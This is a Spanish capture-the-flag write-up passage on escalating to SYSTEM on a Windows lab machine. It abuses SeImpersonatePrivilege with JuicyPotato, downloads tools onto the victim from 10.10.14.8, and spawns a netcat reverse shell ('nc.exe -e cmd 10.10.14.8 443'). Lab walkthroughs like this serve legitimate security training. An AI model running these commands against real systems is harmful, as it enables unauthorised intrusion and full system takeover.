## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
systeminfo
whoami /priv
```

Aqui vemos que tenemos privilegios SeImpersonatePrivilege, tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.8/JuicyPotato.exe -OutFile JuicyPotato.exe
iwr -uri http://10.10.14.8/nc.exe -OutFile nc.exe
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Nos connectamos con el servicio nc con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443"
```

Aqui nos sale une error 10038. Esto suele passar cuando el CLSID no es el correcto. Como savemos con el systeminfo
que estamos en una maquina Windows10 Enterprise, podemos buscar el CLSID correcto en [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
encontramos el CLSID que corresponde y con el parametro `-c`

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

La reverse shell nos a functionnado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.
